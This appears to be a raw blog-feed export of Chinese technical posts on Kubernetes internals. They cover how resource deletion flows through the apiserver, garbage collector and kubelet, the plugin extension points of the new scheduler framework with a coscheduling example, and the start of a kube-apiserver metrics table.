<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;server&#x2F;genericapiserver.go:InstallAPIGroups()</span><br><span class="line">k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;server&#x2F;genericapiserver.go:installAPIResources()</span><br><span class="line">k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;endpoints&#x2F;groupversion.go:InstallREST()</span><br><span class="line">k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;endpoints&#x2F;installer.go:Install()</span><br><span class="line">k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;endpoints&#x2F;installer.go:registerResourceHandlers()</span><br></pre></td></tr></table></figure>
<p>rest注册的核心函数：将rest请求直接映射为etcd存储的操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">staging&#x2F;src&#x2F;k8s.io&#x2F;apiserver&#x2F;pkg&#x2F;endpoints&#x2F;installer.go:183  registerResourceHandlers()</span><br></pre></td></tr></table></figure>
<p>删除的rest请求对应的处理请求在这里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .....</span><br><span class="line">actions &#x3D; appendIf(actions, action&#123;&quot;GET&quot;, itemPath, nameParams, namer, false&#125;, isGetter)</span><br><span class="line">	if getSubpath &#123;</span><br><span class="line">		actions &#x3D; appendIf(actions, action&#123;&quot;GET&quot;, itemPath + &quot;&#x2F;&#123;path:*&#125;&quot;, proxyParams, namer, false&#125;, isGetter)</span><br><span class="line">	&#125;</span><br><span class="line">	actions &#x3D; appendIf(actions, action&#123;&quot;PUT&quot;, itemPath, nameParams, namer, false&#125;, isUpdater)</span><br><span class="line">	actions &#x3D; appendIf(actions, action&#123;&quot;PATCH&quot;, itemPath, nameParams, namer, false&#125;, isPatcher)</span><br><span class="line">	#删除的处理函数</span><br><span class="line">	actions &#x3D; appendIf(actions, action&#123;&quot;DELETE&quot;, itemPath, nameParams, namer, false&#125;, isGracefulDeleter)</span><br><span class="line">	.....</span><br></pre></td></tr></table></figure>

<p>该接口的定义如下所示,即Delete函数可能直接删除数据，也可能异步删除资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; GracefulDeleter knows how to pass deletion options to allow delayed deletion of a</span><br><span class="line">&#x2F;&#x2F; RESTful object.</span><br><span class="line">type GracefulDeleter interface &#123;</span><br><span class="line">	&#x2F;&#x2F; Delete finds a resource in the storage and deletes it.</span><br><span class="line">	&#x2F;&#x2F; If options are provided, the resource will attempt to honor them or return an invalid</span><br><span class="line">	&#x2F;&#x2F; request error.</span><br><span class="line">	&#x2F;&#x2F; Although it can return an arbitrary error value, IsNotFound(err) is true for the</span><br><span class="line">	&#x2F;&#x2F; returned error value err when the specified resource is not found.</span><br><span class="line">	&#x2F;&#x2F; Delete *may* return the object that was deleted, or a status object indicating additional</span><br><span class="line">	&#x2F;&#x2F; information about deletion.</span><br><span class="line">	&#x2F;&#x2F; It also returns a boolean which is set to true if the resource was instantly</span><br><span class="line">	&#x2F;&#x2F; deleted or false if it will be deleted asynchronously.</span><br><span class="line">	Delete(ctx genericapirequest.Context, name string, options *metav1.DeleteOptions) (runtime.Object, bool, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有个比较重要的Delete函数，用于在Delete之前做一些业务处理，就包括了我们前面重点提到的设置deletetimestamp 和finalizers字段，对于Statefulset特有的增删改查的预处理，代码都归档在了k8s.io\kubernetes\pkg\registry\apps\statefulset目录，但是对于通用的增删改查预处理操作<br>，代码被归档在了这里 k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/registry/rest/,其中通用的BeforeDelete归档在了staging/src/k8s.io/apiserver/pkg/registry/rest/delete.go:BeforeDelete()<br>其中核心的Delete函数 在staging/src/k8s.io/apiserver/pkg/registry/generic/registry/store.go:Delete()，重点关注下面的代码段,设置删除策略：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">var preconditions storage.Preconditions</span><br><span class="line">if options.Preconditions !&#x3D; nil &#123;</span><br><span class="line">	preconditions.UID &#x3D; options.Preconditions.UID</span><br><span class="line">	preconditions.ResourceVersion &#x3D; options.Preconditions.ResourceVersion</span><br><span class="line">&#125;</span><br><span class="line">#调用BeforeDelete获取是否需要graceful 进行删除</span><br><span class="line">graceful, pendingGraceful, err :&#x3D; rest.BeforeDelete(e.DeleteStrategy, ctx, obj, options)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">	return nil, false, err</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">&#x2F;&#x2F; Handle combinations of graceful deletion and finalization by issuing</span><br><span class="line">&#x2F;&#x2F; the correct updates.</span><br><span class="line">#设置finalizer，为orphan或者foregroundDeletion策略</span><br><span class="line">shouldUpdateFinalizers, _ :&#x3D; deletionFinalizersForGarbageCollection(ctx, e, accessor, options)</span><br><span class="line">&#x2F;&#x2F; TODO: remove the check, because we support no-op updates now.</span><br><span class="line">if graceful || pendingFinalizers || shouldUpdateFinalizers &#123;</span><br><span class="line">    #在etcd数据库更新资源的metadata信息</span><br><span class="line">	err, ignoreNotFound, deleteImmediately, out, lastExisting &#x3D; e.updateForGracefulDeletionAndFinalizers(ctx, name, key, options, preconditions, obj)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; !deleteImmediately covers all cases where err !&#x3D; nil. We keep both to be future-proof.</span><br><span class="line">if !deleteImmediately || err !&#x3D; nil &#123;</span><br><span class="line">	return out, false, err</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>###kube-controller-manager<br>kube-controller-manager内有一个GarbageCollector用于完成资源的清理删除工作，启动的时候首先会运行一个dependencyGraphBuilder 用于构建集群资源的依赖关系图谱，这个graphbuild 会获取集群的全部资源，并根根据资源的metadata信息构建关系图谱<br>，并基于事件监听更新 关系图谱</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pkg&#x2F;controller&#x2F;garbagecollector&#x2F;graph_builder.go:startMonitors()</span><br><span class="line">func (gb *GraphBuilder) startMonitors() &#123;</span><br><span class="line">	gb.monitorLock.Lock()</span><br><span class="line">	defer gb.monitorLock.Unlock()</span><br><span class="line"></span><br><span class="line">	if !gb.running &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; we&#39;re waiting until after the informer start that happens once all the controllers are initialized.  This ensures</span><br><span class="line">	&#x2F;&#x2F; that they don&#39;t get unexpected events on their work queues.</span><br><span class="line">	&lt;-gb.informersStarted</span><br><span class="line">    </span><br><span class="line">    #定义需要为哪些资源建立关系图谱，每个都基于informer进行监听，对于garbargecollect 中的graph，只是获取哪些允许进行删除的资源pkg&#x2F;controller&#x2F;garbagecollector&#x2F;garbagecollector.go:GetDeletableResources() </span><br><span class="line">	monitors :&#x3D; gb.monitors</span><br><span class="line">	started :&#x3D; 0</span><br><span class="line">	for _, monitor :&#x3D; range monitors &#123;</span><br><span class="line">		if monitor.stopCh &#x3D;&#x3D; nil &#123;</span><br><span class="line">			monitor.stopCh &#x3D; make(chan struct&#123;&#125;)</span><br><span class="line">			gb.sharedInformers.Start(gb.stopCh)</span><br><span class="line">			go monitor.Run()</span><br><span class="line">			started++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>graph_build 中会处理收到的资源状态更新事件，将产生事件的对象放到缓存队列内，主要pkg/controller/garbagecollector/graph_builder.go:processGraphChanges()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Dequeueing an event from graphChanges, updating graph, populating dirty_queue.</span><br><span class="line">func (gb *GraphBuilder) processGraphChanges() bool &#123;</span><br><span class="line">	item, quit :&#x3D; gb.graphChanges.Get()</span><br><span class="line">	....</span><br><span class="line">	case (event.eventType &#x3D;&#x3D; addEvent || event.eventType &#x3D;&#x3D; updateEvent) &amp;&amp; found:</span><br><span class="line">		&#x2F;&#x2F; handle changes in ownerReferences</span><br><span class="line">		added, removed, changed :&#x3D; referencesDiffs(existingNode.owners, accessor.GetOwnerReferences())</span><br><span class="line">		if len(added) !&#x3D; 0 || len(removed) !&#x3D; 0 || len(changed) !&#x3D; 0 &#123;</span><br><span class="line">			&#x2F;&#x2F; check if the changed dependency graph unblock owners that are</span><br><span class="line">			&#x2F;&#x2F; waiting for the deletion of their dependents.</span><br><span class="line">			gb.addUnblockedOwnersToDeleteQueue(removed, changed)</span><br><span class="line">			&#x2F;&#x2F; update the node itself</span><br><span class="line">			existingNode.owners &#x3D; accessor.GetOwnerReferences()</span><br><span class="line">			&#x2F;&#x2F; Add the node to its new owners&#39; dependent lists.</span><br><span class="line">			gb.addDependentToOwners(existingNode, added)</span><br><span class="line">			&#x2F;&#x2F; remove the node from the dependent list of node that are no longer in</span><br><span class="line">			&#x2F;&#x2F; the node&#39;s owners list.</span><br><span class="line">			gb.removeDependentFromOwners(existingNode, removed)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if beingDeleted(accessor) &#123;</span><br><span class="line">			existingNode.markBeingDeleted()</span><br><span class="line">		&#125;</span><br><span class="line">		gb.processTransitions(event.oldObj, accessor, existingNode)</span><br><span class="line">	case event.eventType &#x3D;&#x3D; deleteEvent:</span><br><span class="line">		if !found &#123;</span><br><span class="line">			klog.V(5).Infof(&quot;%v doesn&#39;t exist in the graph, this shouldn&#39;t happen&quot;, accessor.GetUID())</span><br><span class="line">			return true</span><br><span class="line">		&#125;</span><br><span class="line">		&#x2F;&#x2F; removeNode updates the graph</span><br><span class="line">		gb.removeNode(existingNode)</span><br><span class="line">		existingNode.dependentsLock.RLock()</span><br><span class="line">		defer existingNode.dependentsLock.RUnlock()</span><br><span class="line">		if len(existingNode.dependents) &gt; 0 &#123;</span><br><span class="line">			gb.absentOwnerCache.Add(accessor.GetUID())</span><br><span class="line">		&#125;</span><br><span class="line">		for dep :&#x3D; range existingNode.dependents &#123;</span><br><span class="line">		     #将需要删除的资源加入到attemptToDelete队列</span><br><span class="line">			gb.attemptToDelete.Add(dep)</span><br><span class="line">		&#125;</span><br><span class="line">		for _, owner :&#x3D; range existingNode.owners &#123;</span><br><span class="line">			ownerNode, found :&#x3D; gb.uidToNode.Read(owner.UID)</span><br><span class="line">			if !found || !ownerNode.isDeletingDependents() &#123;</span><br><span class="line">				continue</span><br><span class="line">			&#125;</span><br><span class="line">			&#x2F;&#x2F; this is to let attempToDeleteItem check if all the owner&#39;s</span><br><span class="line">			&#x2F;&#x2F; dependents are deleted, if so, the owner will be deleted.</span><br><span class="line">			#将需要删除的资源加入到attemptToDelete队列</span><br><span class="line">			gb.attemptToDelete.Add(ownerNode)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pkg/controller/garbagecollector/garbagecollector.go:attemptToDeleteWorker() 处理每个删除对象的事件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (gc *GarbageCollector) attemptToDeleteItem(item *node) error &#123;</span><br><span class="line">....</span><br><span class="line">   #在这里出进行处理，当发现需要删除Statefulset时，先判断是否需要进行删除该Statefulset的附属资源，先进行附属资源的删除</span><br><span class="line">	&#x2F;&#x2F; attemptToOrphanWorker() into attemptToDeleteItem() as well.</span><br><span class="line">	if item.isDeletingDependents() &#123;</span><br><span class="line">		return gc.processDeletingDependentsItem(item)</span><br><span class="line">	&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">		switch &#123;</span><br><span class="line">		case hasOrphanFinalizer(latest):</span><br><span class="line">			&#x2F;&#x2F; if an existing orphan finalizer is already on the object, honor it.</span><br><span class="line">			policy &#x3D; metav1.DeletePropagationOrphan</span><br><span class="line">		case hasDeleteDependentsFinalizer(latest):</span><br><span class="line">			&#x2F;&#x2F; if an existing foreground finalizer is already on the object, honor it.</span><br><span class="line">			policy &#x3D; metav1.DeletePropagationForeground</span><br><span class="line">		default:</span><br><span class="line">			&#x2F;&#x2F; otherwise, default to background.</span><br><span class="line">			policy &#x3D; metav1.DeletePropagationBackground</span><br><span class="line">		&#125;</span><br><span class="line">		#这里会将Statefulset的POd 在数据库中直接删除</span><br><span class="line">		klog.V(2).Infof(&quot;delete object %s with propagation policy %s&quot;, item.identity, policy)</span><br><span class="line">		return gc.deleteObject(item.identity, &amp;policy)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#完成附属资源的删除</span><br><span class="line">&#x2F;&#x2F; process item that&#39;s waiting for its dependents to be deleted</span><br><span class="line">func (gc *GarbageCollector) processDeletingDependentsItem(item *node) error &#123;</span><br><span class="line">	blockingDependents :&#x3D; item.blockingDependents()</span><br><span class="line">	if len(blockingDependents) &#x3D;&#x3D; 0 &#123;</span><br><span class="line">		klog.V(2).Infof(&quot;remove DeleteDependents finalizer for item %s&quot;, item.identity)</span><br><span class="line">		#在etcd内移除pod的finakuzed字段，会同时将该资源在数据库删除</span><br><span class="line">		return gc.removeFinalizer(item, metav1.FinalizerDeleteDependents)</span><br><span class="line">	&#125;</span><br><span class="line">	for _, dep :&#x3D; range blockingDependents &#123;</span><br><span class="line">		if !dep.isDeletingDependents() &#123;</span><br><span class="line">			klog.V(2).Infof(&quot;adding %s to attemptToDelete, because its owner %s is deletingDependents&quot;, dep.identity, item.identity)</span><br><span class="line">			gc.attemptToDelete.Add(dep)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>##kubelet<br>kubelet主要完成资源的释放,主要的删除Pod的处理逻辑，在kubelet的主函数syncpod中，当发现是删除pod的事件时，立即处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (kl *Kubelet) syncPod(o syncPodOptions) error &#123;</span><br><span class="line">	&#x2F;&#x2F; pull out the required options</span><br><span class="line">	pod :&#x3D; o.pod</span><br><span class="line">	mirrorPod :&#x3D; o.mirrorPod</span><br><span class="line">	podStatus :&#x3D; o.podStatus</span><br><span class="line">	updateType :&#x3D; o.updateType</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; if we want to kill a pod, do it now!</span><br><span class="line">	if updateType &#x3D;&#x3D; kubetypes.SyncPodKill &#123;</span><br><span class="line">		killPodOptions :&#x3D; o.killPodOptions</span><br><span class="line">		if killPodOptions &#x3D;&#x3D; nil || killPodOptions.PodStatusFunc &#x3D;&#x3D; nil &#123;</span><br><span class="line">			return fmt.Errorf(&quot;kill pod options are required if update type is kill&quot;)</span><br><span class="line">		&#125;</span><br><span class="line">		apiPodStatus :&#x3D; killPodOptions.PodStatusFunc(pod, podStatus)</span><br><span class="line">		kl.statusManager.SetPodStatus(pod, apiPodStatus)</span><br><span class="line">		&#x2F;&#x2F; we kill the pod with the specified grace period since this is a termination</span><br><span class="line">		if err :&#x3D; kl.killPod(pod, nil, podStatus, killPodOptions.PodTerminationGracePeriodSecondsOverride); err !&#x3D; nil &#123;</span><br><span class="line">			kl.recorder.Eventf(pod, v1.EventTypeWarning, events.FailedToKillPod, &quot;error killing pod: %v&quot;, err)</span><br><span class="line">			&#x2F;&#x2F; there was an error killing the pod, so we return that error directly</span><br><span class="line">			utilruntime.HandleError(err)</span><br><span class="line">			return err</span><br><span class="line">		&#125;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>docker</tag>
        <tag>Kuberentes</tag>
        <tag>云原生</tag>
      </tags>
  </entry>
  <entry>
    <title>kubernetes 新版调度器框架</title>
    <url>/2021/01/19/kubernetes-%E6%96%B0%E7%89%88%E8%B0%83%E5%BA%A6%E5%99%A8%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="新版本调度器框架用来解决的问题"><a href="#新版本调度器框架用来解决的问题" class="headerlink" title="新版本调度器框架用来解决的问题"></a>新版本调度器框架用来解决的问题</h2><ol>
<li>当前版本的调度器，越来越多的特性被加入到调度器，让调度器的代码越来越多，逻辑越来越复杂，不容易维护，不容易发现问题</li>
<li>当前版本的调度器extender机制扩展点有限，对于”Filter”类型的扩展，只能在默认的预选函数之后执行，”Preempt”类型的扩展只能在默认的抢占函数之后调用，只能有一个Binding 的扩展，而且这个Bind 扩展会代替默认的扩展功能，extender扩展机制不能在任意点调用，例如无法在默认的 预选函数之前进行调用</li>
<li>每次调用Extender时，都需要对json数据进行解析，调用http 服务的速度慢与直接本地的api调用</li>
<li>没有默认调度器与extender的交互机制，例如当extender 扩展出现异常时，无法通知默认的调度器</li>
<li>extender的调度器是以一个单独的进程运行，不能共享默认调度器的cache，需要extender 构建自己的cache<h2 id="新版本调度器框架机制"><a href="#新版本调度器框架机制" class="headerlink" title="新版本调度器框架机制"></a>新版本调度器框架机制</h2>在调度一个Pod时，分为调度部分和绑定部分，其中调度部分用于为Pod选择一个节点，绑定部分将调度部分的决策作用于集群，一个调度Cycle和一个绑定Cycle 被称为一个调度上下文，其中多个调度Cycle是串行运行，绑定Cycle 是并行运行，对于一个Pod，当出现内部错误时或者该Pod无法被调度时，调度Cycle 和绑定Cycle就会终止，这个Pod 被重新放到调度队列</li>
</ol>
<p>插件扩展点：</p>
<p><img src="/2021/01/19/kubernetes-%E6%96%B0%E7%89%88%E8%B0%83%E5%BA%A6%E5%99%A8%E6%A1%86%E6%9E%B6/1.png" alt="avatar"></p>
<ol>
<li><p>Queue Sort</p>
<p>在这个插件点的插件 用于对调度队列中的Pod进行排序</p>
</li>
<li><p>PreFilter</p>
<p>在这个插件点的插件，用于对Pod进行预处理、检查集群、Pod，当该插件出现错误是，该调度会结束，PreFilter在调度周期内只会调用一次</p>
</li>
<li><p>Filter</p>
<p> 过滤出不能运行Pod的节点，对于每一个Node，调度器都会按照顺序调用filter插件，都某个一个Filter插件判断Node不符合要求时，不会再对该节点调用其他插件。多个Node会并行进行评估，在一个调度周期内，Filter可能会被调用多次</p>
</li>
<li><p>PostFilter</p>
<p> 在Filter插件点后进行调用，只有当没有为Pod找到Node时，才会调用该PostFilter节点的插件，当其中一个PostFilter节点为Pod找到了一个节点，其他的PostFilter插件不会再调用</p>
</li>
<li><p>PreScore</p>
<p>用于更新内部状态、产生日志、监控信息等</p>
</li>
<li><p>Scoring</p>
<p>和原调度器的打分机制相同，包含打分和归一化两部分</p>
</li>
<li><p>Reserve</p>
<p>包含Reserve和Unreserve两部分，用于通知为Pod在Node上预留节点或者不为Pod预留资源，该阶段会在Bind之前进行调用，这个地方在做gang scheduling 的时候比较有用</p>
</li>
<li><p>Permit</p>
<p> 用于限制或者推迟Pod的绑定，有三种结果，Approve：当所有的Permit 插件都是Approve时，这个Pod将会被Bind。 Deny：如果任意一个Permit插件Deny，则这个Pod就会重新被放入到调度队列。Wait：如果一个Permit插件提示Wait，则需要在timeout时间内等待其他的Permit插件提示Approve，如果timeout时间内没有等到Approve，则该Pod会被重新放入到调度队列</p>
</li>
<li><p>PreBind</p>
<p>做一些Pod bind之前的准备工作，例如创建网络存储的卷，将卷挂载到主机，如果任意一个PreBind 插件报错，该Pod就会重新被放到调度队列中，重新进行调度</p>
</li>
<li><p>Bind</p>
<p>将Pod 绑定到Node，可能会存在多个Bind plugin，不同的Bind Plugin 可能会选择不同的Pod进行Bind</p>
</li>
<li><p>PostBind</p>
<p>这里主要用于信息扩展，当一个Pod被成功Bind到一个节点时，意味着一个调度周期结束，可以用于清理一些相关的资源</p>
</li>
</ol>
<h2 id="插件生命周期"><a href="#插件生命周期" class="headerlink" title="插件生命周期"></a>插件生命周期</h2><ol>
<li>初始化<br>需要两步完成插件的初始化，首先，插件需要被注册，其次调度器会根据配置选择初始化的插件，如果一个插件在多个扩展点注册，该插件只会被初始化一次</li>
</ol>
<ol start="2">
<li><p>并发</p>
<p>在编写插件时，需要考虑两种类型的插件并发，当在并发评估每个节点时，一个插件可能会被调用多次，在多个调度的上下文，一个插件也可能能被并发调用，但是在一个调度的上下文内，插件是被顺序调用。</p>
<p>如下图所示，调度器的Main thread。一次只处理一个调度周期，任意的在Permit扩展点之上的扩展点，包括Permit扩展点，会在下一个调度周期开始之前全部结束，Permit 之后，Bind Thread会并发执行，并发执行，就是扩展插件可能会被两个不同的上下文执行，其中Reserver插件的Unreserve函数可能会在main thread或者 bind thread中被调用</p>
</li>
</ol>
<p><img src="/2021/01/19/kubernetes-%E6%96%B0%E7%89%88%E8%B0%83%E5%BA%A6%E5%99%A8%E6%A1%86%E6%9E%B6/2.png" alt="avatar"></p>
<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><ol>
<li>定义插件的对象和构造函数</li>
</ol>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// QoSSort is a plugin that implements QoS class based sorting.</span></span><br><span class="line"><span class="keyword">type</span> Sort <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="comment">// New initializes a new plugin and returns it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(_ *runtime.Unknown, _ framework.FrameworkHandle)</span> <span class="params">(framework.Plugin, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;Sort&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>根据插件对应的插件点，实现对应的接口函数</li>
</ol>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// QueueSortPlugin is an interface that must be implemented by "QueueSort" plugins.</span></span><br><span class="line"><span class="comment">// These plugins are used to sort pods in the scheduling queue. Only one queue sort</span></span><br><span class="line"><span class="comment">// plugin may be enabled at a time.</span></span><br><span class="line"><span class="keyword">type</span> QueueSortPlugin <span class="keyword">interface</span> &#123;</span><br><span class="line">    Plugin</span><br><span class="line">    <span class="comment">// Less are used to sort pods in the scheduling queue.</span></span><br><span class="line">    Less(*PodInfo, *PodInfo) <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>插件注册</li>
</ol>
<p>在调度器的启动的main 函数添加自定义的调度插件</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cmd/main.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    command := app.NewSchedulerCommand(</span><br><span class="line">        app.WithPlugin(qos.Name, qos.New),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> err := command.Execute(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>编译启动</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bin&#x2F;kube-scheduler --kubeconfig&#x3D;scheduler.conf --config&#x3D;.&#x2F;manifests&#x2F;qos&#x2F;scheduler-config.yaml</span><br></pre></td></tr></table></figure>

<h2 id="Use-Case"><a href="#Use-Case" class="headerlink" title="Use Case"></a>Use Case</h2><h3 id="Coscheduling-批调度"><a href="#Coscheduling-批调度" class="headerlink" title="Coscheduling 批调度"></a>Coscheduling 批调度</h3><p>Coscheduling 和之前理解的gang scheduling 有些区别，引用<a href="https://blog.csdn.net/yunqiinsight/article/details/107350005" target="_blank" rel="noopener">这里</a>的一些描述</p>
<blockquote>
<p>Wikipedia对 Coscheduling的定义是“在并发系统中将多个相关联的进程调度到不同处理器上同时运行的策略”。在Coscheduling的场景中，最主要的原则是保证所有相关联的进程能够同时启动。防止部分进程的异常，导致整个关联进程组的阻塞。这种导致阻塞的部分异常进程，称之为“碎片（fragement）”。<br>在Coscheduling的具体实现过程中，根据是否允许“碎片”存在，可以细分为Explicit Coscheduling，Local Coscheduling和Implicit Coscheduling。 其中Explicit Coscheduling就是大家常听到的Gang Scheduling。Gang Scheduling要求完全不允许有“碎片”存在， 也就是“All or Nothing”。维基百科的具体解释</p>
</blockquote>
<blockquote>
<p>Explicit coscheduling requires all processing to actually take place at the same time, and is typically implemented by global scheduling across all processors. A specific algorithm is known as gang scheduling.<br>Local coscheduling allows individual processors to schedule the processing independently.<br>Dynamic (or implicit) coscheduling is a form of coscheduling where individual processors can still schedule processing independently, but they make scheduling decisions in cooperation with other processors.</p>
</blockquote>
<blockquote>
<p>我们将上述定义的概念对应到Kubernetes中，就可以理解Kubernetes调度系统支持批任务Coscheduling的含义了。 一个批任务（关联进程组）包括了N个Pod（进程），Kubernetes调度器负责将这N个Pod调度到M个节点（处理器）上同时运行。如果这个批任务需要部分Pod同时启动即可运行，我们称需启动Pod的最小数量为min-available。特别地，当min-available=N时，批任务要求满足Gang Scheduling。</p>
</blockquote>
<p>这里基于Kubernetes新版本的调度框架开发的Coscheduling 借鉴了kube-batch调度器的思想，也有PodGroup的概念，只是把kube-batch的一些功能拆为了多个调度器插件<br><a href="https://github.com/kubernetes-sigs/scheduler-plugins/tree/master/pkg/coscheduling" target="_blank" rel="noopener">项目地址</a></p>
<p><img src="/2021/01/19/kubernetes-%E6%96%B0%E7%89%88%E8%B0%83%E5%BA%A6%E5%99%A8%E6%A1%86%E6%9E%B6/3.png" alt="avatar"></p>
<p>用到的几个插件扩展点</p>
<p>QueueSort插件：这里主要是将调度队列中 属于同一Podgroup到的Pod 放在一起，并安装PodGroup的创建时间/优先级，对Pod进行排序，来决定Pod进入调度队列的先后顺序。</p>
<p>Prefilter插件：判断该PodGroup中的已经运行的Pod是否已经满足最小的Pod 运行数量，如果已经满足，则不再对该PodGroup中Pennding的Pod进行调度</p>
<p>Permit插件：该插件主要是延迟绑定，即Pod进入到Permit阶段时，用户可以自定义条件来允许Pod通过、拒绝Pod通过以及让Pod等待状态(可设置超时时间)。Permit的延迟绑定的功能，刚好可以让属于同一个PodGruop的Pod调度到这个节点时，进行等待，等待积累的Pod数目满足足够的数目时，再统一运行同一个PodGruop的所有Pod进行绑定并创建。</p>
<p>UnReserve插件：当某个Pod Permit 的时间超时，则会进入UnReserve阶段，则会将该Pod所在的PodGroup中所有的Pod都UnReserve，重新进入Pennding队列</p>
<h3 id="Dynamic-Resource-Binding"><a href="#Dynamic-Resource-Binding" class="headerlink" title="Dynamic Resource Binding"></a>Dynamic Resource Binding</h3><p>NA</p>
<h3 id="Custom-Scheduler-Plugins"><a href="#Custom-Scheduler-Plugins" class="headerlink" title="Custom Scheduler Plugins"></a>Custom Scheduler Plugins</h3><p>编写自定义调度插件时，不需要fork k8s 原生的调度代码，只需要要引入这些代码就可以，如下所示</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    scheduler <span class="string">"k8s.io/kubernetes/cmd/kube-scheduler/app"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    command := scheduler.NewSchedulerCommand(</span><br><span class="line">            scheduler.WithPlugin(<span class="string">"example-plugin1"</span>, ExamplePlugin1),</span><br><span class="line">            scheduler.WithPlugin(<span class="string">"example-plugin2"</span>, ExamplePlugin2))</span><br><span class="line">    <span class="keyword">if</span> err := command.Execute(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Fprintf(os.Stderr, <span class="string">"%v\n"</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>kubernetes中的内置监控指标</title>
    <url>/2022/01/12/kubernetes%E4%B8%AD%E7%9A%84%E5%86%85%E7%BD%AE%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/</url>
    <content><![CDATA[<h2 id="kube-apiserver-metrics"><a href="#kube-apiserver-metrics" class="headerlink" title="kube-apiserver metrics"></a>kube-apiserver metrics</h2><table>
<thead>
<tr>
<th>表头</th>
<th>表头</th>
</tr>
</thead>
<tbody><tr>
<td>单元格</td>
<td>单元格</td>
</tr>
<tr>
<td>单元格</td>
<td>单元格</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>指标名</th>
<th>类型</th>
<th>含义</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>apiserver_request_total</td>
<td>counter</td>
<td>请求总数</td>
<td>sum_by使用    按状态码code分布 2xx 3xx 4xx 5xx 等,按动作verb分布 list get watch post delete等,按资源resource分布: pod node endpoint等</td>
</tr>
</tbody></table>
<p>|apiserver_request_duration_seconds_sum|    gauge    请求延迟记录和    按动作verb分布 list get watch post delete等<br>按资源resource分布: pod node endpoint等<br>apiserver_request_duration_seconds_count    gauge    请求延迟记录数    计算平均延迟: apiserver_request_duration_seconds_sum/apiserver_request_duration_seconds_count<br>apiserver_response_sizes_sum    counter    请求响应大小记录和<br>apiserver_response_sizes_count    counter    请求响应大小记录数<br>authentication_attempts    counter    认证尝试数<br>authentication_duration_seconds_sum    counter    认证耗时记录和<br>authentication_duration_seconds_count    counter    认证耗时记录数<br>apiserver_tls_handshake_errors_total    counter    tls握手失败计数<br>apiserver_client_certificate_expiration_seconds_sum    gauge    证书过期时间总数<br>apiserver_client_certificate_expiration_seconds_count    gauge    证书过期时间记录个数<br>apiserver_client_certificate_expiration_seconds_bucket    gauge    证书过期时间分布<br>apiserver_current_inflight_requests    gauge    